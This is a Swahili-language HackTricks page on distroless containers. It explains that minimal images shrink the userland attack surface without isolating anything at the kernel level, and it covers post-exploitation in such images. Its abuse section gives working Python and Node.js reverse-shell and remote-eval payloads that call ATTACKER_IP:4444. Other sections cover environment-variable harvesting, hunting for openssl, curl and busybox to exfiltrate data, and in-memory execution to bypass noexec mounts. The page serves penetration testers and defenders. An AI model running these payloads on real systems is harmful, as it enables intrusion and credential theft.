# Distroless Containers

{{#include ../../../banners/hacktricks-training.md}}

## Muhtasari

Image ya container ya **distroless** husafirisha **vipengele vya chini kabisa vya runtime vinavyohitajika kuendesha programu moja mahususi**, huku ikiondoa kimakusudi zana za kawaida za distro kama vile package managers, shells, na seti kubwa za huduma za jumla za userland. Kwa kawaida, images za distroless huwa na binary au runtime ya programu pekee, shared libraries zake, vifurushi vya vyeti, na mpangilio mdogo sana wa filesystem. <sup>[[1]](#references)</sup>

Lengo si kwamba distroless ni primitive mpya ya kernel isolation. Distroless ni **mkakati wa usanifu wa image**. Hubadilisha vitu vinavyopatikana **ndani ya** filesystem ya container, wala si jinsi kernel inavyoitenga container. Tofauti hiyo ni muhimu, kwa sababu distroless huimarisha mazingira hasa kwa kupunguza vitu ambavyo mshambuliaji anaweza kutumia baada ya kupata code execution. Haibadilishi namespaces, seccomp, capabilities, AppArmor, SELinux, au utaratibu mwingine wowote wa runtime isolation.

## Kwa Nini Distroless Ipo

Images za distroless hutumiwa hasa kupunguza:

- ukubwa wa image
- utata wa kiutendaji wa image
- idadi ya packages na binaries zinazoweza kuwa na vulnerabilities
- idadi ya zana za post-exploitation zinazopatikana kwa mshambuliaji kwa chaguo-msingi

Ndiyo maana images za distroless ni maarufu katika deployments za production za programu. Container isiyo na shell, package manager, na karibu haina zana za jumla kwa kawaida ni rahisi zaidi kuisimamia na ni vigumu zaidi kuitumia vibaya kwa mwingiliano baada ya kuathiriwa.

Mifano ya familia maarufu za images zinazofanana na distroless ni pamoja na:

- images za distroless za Google <sup>[[1]](#references)</sup>
- images za Chainguard zilizoimarishwa/ndogo <sup>[[2]](#references)</sup>

## Distroless Haumaanishi Nini

Container ya distroless **si**:

- rootless kiotomatiki
- isiyo na privileges kiotomatiki
- read-only kiotomatiki
- inayolindwa kiotomatiki na seccomp, AppArmor, au SELinux
- salama kiotomatiki dhidi ya container escape

Bado inawezekana kuendesha image ya distroless kwa `--privileged`, kushiriki host namespaces, kutumia bind mounts hatari, au kuweka runtime socket kama mount. Katika hali hiyo, image inaweza kuwa ndogo, lakini container bado inaweza kuwa hatarishi sana. Distroless hubadilisha **attack surface ya userland**, si **mpaka wa uaminifu wa kernel**.

## Sifa za Kawaida za Kiutendaji

Unapoathiri container ya distroless, jambo la kwanza unalogundua kwa kawaida ni kwamba dhana za kawaida hazitumiki tena. Huenda isiwe na `sh`, `bash`, `ls`, `id`, `cat`, na wakati mwingine hata isiwe na mazingira yanayotegemea libc yanayofanya kazi kwa namna ambayo tradecraft yako ya kawaida inatarajia. Hili huathiri mashambulizi na ulinzi, kwa sababu ukosefu wa zana hufanya debugging, incident response, na post-exploitation kuwa tofauti.

Mifumo ya kawaida zaidi ni:

- runtime ya programu ipo, lakini vingine vichache sana
- payloads zinazotegemea shell hushindwa kwa sababu hakuna shell
- one-liners za kawaida za enumeration hushindwa kwa sababu binaries saidizi hazipo
- ulinzi wa filesystem kama read-only rootfs au `noexec` kwenye sehemu za tmpfs zinazoweza kuandikwa mara nyingi huwa pia

Mchanganyiko huo ndio kwa kawaida husababisha watu kuzungumzia "weaponizing distroless".

## Distroless na Post-Exploitation

Changamoto kuu ya mashambulizi katika mazingira ya distroless si kila wakati RCE ya awali. Mara nyingi ni hatua inayofuata. Ikiwa workload iliyoathiriwa inakupa code execution ndani ya language runtime kama Python, Node.js, Java, au Go, unaweza kutekeleza mantiki yoyote, lakini si kupitia workflows za kawaida zinazotegemea shell ambazo hutumika sana kwenye targets nyingine za Linux.

Hiyo ina maana kwamba post-exploitation mara nyingi huelekea kwenye mojawapo ya njia hizi tatu:

1. **Tumia language runtime iliyopo moja kwa moja** kuorodhesha mazingira, kufungua sockets, kusoma files, au kuweka payloads za ziada.
2. **Leta zana zako mwenyewe kwenye memory** ikiwa filesystem ni read-only au sehemu zinazoweza kuandikwa zimewekwa mount ya `noexec`.
3. **Tumia vibaya binaries zilizopo tayari kwenye image** ikiwa programu au dependencies zake zinajumuisha kitu chenye manufaa yasiyotarajiwa.

## Abuse

### Orodhesha Runtime Ambayo Tayari Unayo

Katika containers nyingi za distroless hakuna shell, lakini bado kuna application runtime. Ikiwa target ni service ya Python, Python ipo. Ikiwa target ni Node.js, Node ipo. Mara nyingi hilo hutoa utendaji wa kutosha kuorodhesha files, kusoma environment variables, kufungua reverse shells, na kuweka utekelezaji wa ndani ya memory bila hata kutumia `/bin/sh`.

Mfano rahisi wa Python:

```bash
python3 - <<'PY'
import os, socket, subprocess
print("uid", os.getuid())
print("cwd", os.getcwd())
print("env keys", list(os.environ)[:20])
print("root files", os.listdir("/")[:30])
PY
```

Mfano rahisi kwa Node.js:

```bash
node -e 'const fs=require("fs"); console.log(process.getuid && process.getuid()); console.log(fs.readdirSync("/").slice(0,30)); console.log(Object.keys(process.env).slice(0,20));'
```

Impact:

- urejeshaji wa vigezo vya mazingira, ambavyo mara nyingi hujumuisha credentials au service endpoints
- kuorodhesha mfumo wa faili bila `/bin/ls`
- kutambua njia zinazoweza kuandikika na secrets zilizowekwa

### Runtime Inayoingiliana Bila `/bin/sh`

Ikiwa image haina `sh` au `bash`, reverse shell ya kawaida inayotegemea shell hushindwa. Katika hali hiyo, fungua session inayoingiliana ndani ya runtime ya lugha iliyosakinishwa badala ya kuanzisha shell ambayo haipo.

Kwa mfano, payload hii ya Python huelekeza upya console ya Python inayoingiliana kupitia socket:

```bash
python3 - <<'PY'
import code, socket, sys
s = socket.create_connection(("ATTACKER_IP", 4444))
stream = s.makefile("rw", buffering=1)
sys.stdin = sys.stdout = sys.stderr = stream
code.interact(local=globals())
PY
```

Mbinu sawa katika Node.js inaweza kutathmini JavaScript iliyopokelewa kupitia socket. Hii ni REPL ya JavaScript, si shell ya mfumo wa uendeshaji; shughuli za mfumo wa faili, michakato na mtandao lazima zifanywe kupitia API za Node:

```bash
node -e 'const net=require("net");const s=net.connect(4444,"ATTACKER_IP");s.on("data",d=>{try{s.write(String(eval(d.toString()))+"\n")}catch(e){s.write(String(e)+"\n")}});'
```

Mifano yote miwili inahitaji muunganisho wa nje na interpreter inayopatikana, na yote hutoa tu utendakazi unaotolewa na interpreter hiyo.

Ikiwa image inajumuisha `/bin/sh` bila kutarajiwa, payload za kawaida za shell zinazosaidiwa na interpreter bado zinafaa. Zimeonyeshwa kando kwa sababu si shell-free kihalisi:

```bash
# Python plus an existing /bin/sh
python3 - <<'PY'
import os, pty, socket
s = socket.create_connection(("ATTACKER_IP", 4444))
for fd in (0, 1, 2):
    os.dup2(s.fileno(), fd)
pty.spawn("/bin/sh")
PY

# Node.js plus an existing /bin/sh
node -e 'const net=require("net"),cp=require("child_process");const s=net.connect(4444,"ATTACKER_IP",()=>{const p=cp.spawn("/bin/sh",[]);s.pipe(p.stdin);p.stdout.pipe(s);p.stderr.pipe(s);});'
```

Muundo wa zamani wa Python wa mzunguko wa amri pia ni muhimu pale ambapo `/bin/sh` ipo lakini PTY ya maingiliano haifai. Umehifadhiwa hapa huku utegemezi wake halisi ukiwekwa wazi: `subprocess.run(..., shell=True)` hutumia shell ya mfumo na kwa hiyo **si** mbinu isiyotumia shell.

```bash
python3 -c '
import subprocess
while True:
    cmd = input("sh> ")
    if cmd.strip() in ("exit", "quit"):
        break
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    print(result.stdout, end="")
    print(result.stderr, end="")
'
```

### Mfano Kamili: Mzunguko wa Amri wa Python Bila Shell

Ikiwa image ina Python lakini haina shell kabisa, REPL ya ndani ya Python bado inaweza kusaidia kukagua mfumo wa faili, mazingira na mtandao:

```bash
python3 - <<'PY'
namespace = {}
while True:
    source = input("py> ")
    if source.strip() in ("exit", "quit"):
        break
    try:
        result = eval(source, namespace)
        if result is not None:
            print(repr(result))
    except SyntaxError:
        exec(source, namespace)
PY
```

Mzunguko huu hauiti `/bin/sh`. Hutathmini moja kwa moja misemo na kauli za Python, kwa hiyo shughuli lazima zitumie Python APIs badala ya amri za shell. Licha ya kizuizi hicho, bado unaweza kutoa sehemu kubwa ya uwezo wa shell ya msingi: kuorodhesha mfumo wa faili na mazingira, kufikia data, kufanya shughuli za mtandao, na kuweka payloads zaidi tayari kupitia runtime iliyosakinishwa.

### Utekelezaji wa Zana Katika Kumbukumbu

Picha za Distroless mara nyingi huunganishwa na:

- `readOnlyRootFilesystem: true`
- tmpfs inayoweza kuandikika lakini yenye `noexec`, kama vile `/dev/shm`
- ukosefu wa zana za usimamizi wa vifurushi

Mchanganyiko huo hufanya mbinu za kawaida za "kupakua binary kwenye diski na kuiendesha" zisiwe za kuaminika. Katika hali hizo, mbinu za utekelezaji kutoka kwenye kumbukumbu huwa suluhisho kuu.

Ukurasa maalum kuhusu hilo ni:

{{#ref}}
../../linux-basics/bypass-linux-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

Mbinu zinazohusika zaidi humo ni:

- `memfd_create` + `execve` kupitia scripting runtimes <sup>[[4]](#references)</sup>
- DDexec / EverythingExec
- memexec
- memdlopen

Kwa huduma ya Python, Node.js, au PHP, sehemu ya kuingilia inaweza kuwa hitilafu ya programu kama vile template injection, prototype pollution, au evaluation isiyo salama. Ikiwa hitilafu hiyo itatoa code execution ndani ya mchakato, mbinu ya `/proc/self/mem` inaweza kuendesha loader bila shell au faili inayoweza kutekelezwa kwenye diski. Hii bado ni utekelezaji kwa utambulisho wa mchakato wa kontena; udhaifu tofauti katika mpaka wa runtime au host unahitajika ili kutoroka kwenye kontena. Tazama [mbinu za read-only/noexec/distroless](../../linux-basics/bypass-linux-restrictions/bypass-fs-protections-read-only-no-exec-distroless/README.md) kwa mahitaji ya awali.

### Binaries Zilizopo Tayari Kwenye Picha

Baadhi ya picha za Distroless bado zina binaries zinazohitajika kiutendaji ambazo huwa na manufaa baada ya mfumo kuathiriwa. Mfano unaoonekana mara kwa mara ni `openssl`, kwa sababu programu wakati mwingine huihitaji kwa kazi zinazohusiana na crypto au TLS.

Muundo wa haraka wa utafutaji ni:

```bash
find / -type f \( -name openssl -o -name busybox -o -name wget -o -name curl \) 2>/dev/null
```

Ikiwa `openssl` ipo, inaweza kutumika kwa:

- miunganisho ya TLS inayotoka
- kutoa data kupitia chaneli inayoruhusiwa ya kutoka
- kupanga data ya payload kupitia blobs zilizowekwa msimbo/zilizosimbwa

Matumizi mabaya halisi hutegemea kile kilichosakinishwa, lakini wazo la jumla ni kwamba distroless haimaanishi "hakuna zana kabisa"; inamaanisha "zana chache sana kuliko kwenye image ya kawaida ya distribution".

## Checks

Lengo la ukaguzi huu ni kubaini ikiwa image ni distroless kweli kwa vitendo na ni binaries zipi za runtime au za kusaidia bado zinapatikana kwa post-exploitation.

```bash
find / -maxdepth 2 -type f 2>/dev/null | head -n 100          # Very small rootfs is common in distroless images
which sh bash ash busybox python python3 node java 2>/dev/null   # Identify which runtime or shell primitives exist
cat /etc/os-release 2>/dev/null                                # Often missing or minimal
mount | grep -E ' /( |$)|/dev/shm'                             # Check for read-only rootfs and writable tmpfs
```

Kinachovutia hapa:

- Ikiwa hakuna shell lakini runtime kama Python au Node ipo, post-exploitation inapaswa kuelekezwa kwenye utekelezaji unaoendeshwa na runtime.
- Ikiwa root filesystem ni ya kusoma tu na `/dev/shm` inaweza kuandikwa lakini ina `noexec`, mbinu za utekelezaji kwenye memory huwa muhimu zaidi.
- Ikiwa kuna binary za usaidizi kama `openssl`, `busybox` au `java`, zinaweza kutoa utendaji wa kutosha kuanzisha ufikiaji zaidi.

## Mipangilio Chaguomsingi ya Runtime

| Mtindo wa image / platform | Hali chaguomsingi | Tabia ya kawaida | Udhaifu wa kawaida unaoongezwa kwa mikono |
| --- | --- | --- | --- |
| Image za mtindo wa Google distroless | Userland ndogo kimakusudi | Hakuna shell, hakuna package manager, ni dependencies za application/runtime pekee | kuongeza tabaka za utatuzi, shell za sidecar, kunakili busybox au zana |
| Image ndogo za Chainguard | Userland ndogo kimakusudi | Uso mdogo wa package, mara nyingi hulenga runtime au huduma moja | kutumia `:latest-dev` au variants za utatuzi, kunakili zana wakati wa build |
| Workload za Kubernetes zinazotumia image za distroless | Hutegemea usanidi wa Pod | Distroless huathiri userland pekee; usalama wa Pod bado hutegemea spec ya Pod na mipangilio chaguomsingi ya runtime | kuongeza debug containers za muda, host mounts, mipangilio ya Pod yenye privileges |
| Docker / Podman zinazoendesha image za distroless | Hutegemea run flags | Filesystem ndogo, lakini usalama wa runtime bado hutegemea flags na usanidi wa daemon | `--privileged`, kushiriki host namespace, mounts za runtime socket, host binds zinazoweza kuandikwa |

Jambo kuu ni kwamba distroless ni **sifa ya image**, si ulinzi wa runtime. Thamani yake inatokana na kupunguza vitu vinavyopatikana ndani ya filesystem baada ya kuathiriwa. Multi-stage builds ni njia ya kawaida ya kuacha build tools nje ya image ya mwisho. <sup>[[3]](#references)</sup>

## Kurasa Zinazohusiana

Kwa bypass za filesystem na utekelezaji kwenye memory ambazo huhitajika mara nyingi katika mazingira ya distroless:

{{#ref}}
../../linux-basics/bypass-linux-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

Kwa matumizi mabaya ya container runtime, socket na mount ambayo bado yanafaa kwa workload za distroless:

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}

## References

- [1] [GoogleContainerTools - Image za container za Distroless](https://github.com/GoogleContainerTools/distroless)
- [2] [Nyaraka za Chainguard Images](https://edu.chainguard.dev/chainguard/chainguard-images/)
- [3] [Docker Docs - Multi-stage builds](https://docs.docker.com/build/building/multi-stage/)
- [4] [`memfd_create(2)` - Ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man2/memfd_create.2.html)
{{#include ../../../banners/hacktricks-training.md}}
